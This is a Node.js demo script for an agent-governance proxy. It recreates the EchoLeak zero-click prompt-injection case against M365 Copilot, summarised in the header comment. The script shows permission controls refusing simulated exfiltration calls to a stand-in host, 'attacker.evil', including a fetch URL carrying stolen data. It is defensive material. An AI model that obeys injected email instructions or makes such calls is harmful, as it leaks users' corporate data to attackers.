#!/usr/bin/env node
// EchoLeak (CVE-2025-32711): a crafted email's hidden instructions entered M365
// Copilot's RAG context and made it gather data across OneDrive/SharePoint/Teams
// and exfiltrate it through an auto-fetched image to an attacker URL — zero click.
//
// Reading widely is bad; the loss event is the egress. The controls that stop it:
// the assistant role can search and compose but holds NO outbound grant (deny by
// default), so a net.fetch to the attacker host never reaches a tool body; and
// the one sanctioned data-bearing send is a high-risk skill, refused on the proxy
// unless it runs through a governed flow with a preceding approval gate.
//
// Run: boot the server (`docker compose up`, or locally with
// MAKERCHECKER_AUTH_DISABLED=1), build the SDK, then:
//   node examples/echoleak-m365-copilot-zero-click-exfiltration/demo.mjs
import {
  connect,
  ensureSkill,
  ensureRole,
  ensureAgent,
  ensureGrant,
  governedTool,
  GovernanceDeniedError,
  printTrailAndVerify,
} from "../lib/scenario.mjs";

const client = connect();

// --- Configure MakerChecker for the scenario -------------------------------
const docSearch = await ensureSkill(client, "echoleak-doc-search@1", {
  description: "Scoped read over the indexed corpus",
});
const answerCompose = await ensureSkill(client, "echoleak-answer-compose@1", {
  description: "Draft a response, no egress",
});
const netFetch = await ensureSkill(client, "echoleak-net-fetch@1", {
  description: "Outbound fetch to an arbitrary URL",
});
// The one sanctioned data-bearing send is categorically high-risk: the proxy
// refuses it unless it runs through a governed flow behind an approval gate.
const egressSend = await ensureSkill(client, "echoleak-data-egress-send@1", {
  riskTier: "high",
  description: "Deliver an approved payload to an approved destination",
});

// copilot-assistant answers over corporate data: it may search and compose, but
// holds NO net.fetch grant and NO egress grant. Outbound is ungranted.
const assistantRole = await ensureRole(client, "echoleak-copilot-assistant", {
  description: "Searches the indexed corpus and composes answers; no outbound channel.",
});
// data-release-officer is the only role that can send data out, and even then the
// destination is constrained to an allowlist of approved hosts (fail closed).
const officerRole = await ensureRole(client, "echoleak-data-release-officer", {
  description: "Releases approved payloads to approved destinations only.",
  limits: {
    skills: {
      "echoleak-data-egress-send@1": {
        allowlist: { field: "destination", values: ["partner.corp.example"] },
      },
    },
  },
});

await ensureGrant(client, assistantRole, docSearch);
await ensureGrant(client, assistantRole, answerCompose);
await ensureGrant(client, officerRole, egressSend);

await ensureAgent(client, "echoleak-copilot-bot", "echoleak-copilot-assistant");
await ensureAgent(client, "echoleak-release-bot", "echoleak-data-release-officer");

// --- Drive the governed agents through the proxy ---------------------------
const { session } = await client.proxy.openSession({ label: "echoleak-copilot-answer" });
console.log(`proxy session ${session.id} opened\n`);

const search = governedTool(client, session.id, "echoleak-copilot-bot", "echoleak-doc-search@1", async (i) => ({ hits: 3, query: i.query }));
const compose = governedTool(client, session.id, "echoleak-copilot-bot", "echoleak-answer-compose@1", async (i) => ({ draft: `answer to: ${i.query}` }));
const assistantFetch = governedTool(client, session.id, "echoleak-copilot-bot", "echoleak-net-fetch@1", async () => { throw new Error("unreachable: deny-by-default blocks this"); });
const assistantEgress = governedTool(client, session.id, "echoleak-copilot-bot", "echoleak-data-egress-send@1", async () => { throw new Error("unreachable: deny-by-default blocks this"); });
const officerSend = governedTool(client, session.id, "echoleak-release-bot", "echoleak-data-egress-send@1", async (i) => ({ status: "delivered", destination: i.destination }));

// 1. The assistant searches the corpus and composes — the legitimate task path.
console.log("assistant searches corpus:", JSON.stringify(await search({ query: "Q2 revenue summary" })));
console.log("assistant composes answer:", JSON.stringify(await compose({ query: "Q2 revenue summary" })));

// 2. The injected email fools the model into exfiltrating via an auto-fetched
//    image to the attacker host. The assistant holds no outbound grant, so the
//    fetch is refused by deny-by-default — the stolen context never leaves.
try {
  await assistantFetch({ url: "https://attacker.evil/collect?d=...stolen..." });
} catch (err) {
  if (!(err instanceof GovernanceDeniedError)) throw err;
  console.log(`assistant net.fetch DENIED (${err.code}): ${err.reason}`);
}

// 3. Even the sanctioned send skill is unreachable from the assistant role, and
//    it is high-risk: the proxy refuses it outside a gated flow.
try {
  await assistantEgress({ destination: "attacker.evil", payload: "...stolen..." });
} catch (err) {
  if (!(err instanceof GovernanceDeniedError)) throw err;
  console.log(`assistant data-egress DENIED (${err.code}): ${err.reason}`);
}

// 4. The release officer holds the egress grant, but it is high-risk: a raw proxy
//    call is categorically refused — it must run through a governed flow with a
//    preceding approval gate.
try {
  await officerSend({ destination: "partner.corp.example", payload: "approved-report" });
} catch (err) {
  if (!(err instanceof GovernanceDeniedError)) throw err;
  console.log(`officer egress (no gate) DENIED (${err.code}): ${err.reason}`);
}

await client.proxy.closeSession(session.id);
await printTrailAndVerify(client, session.id);
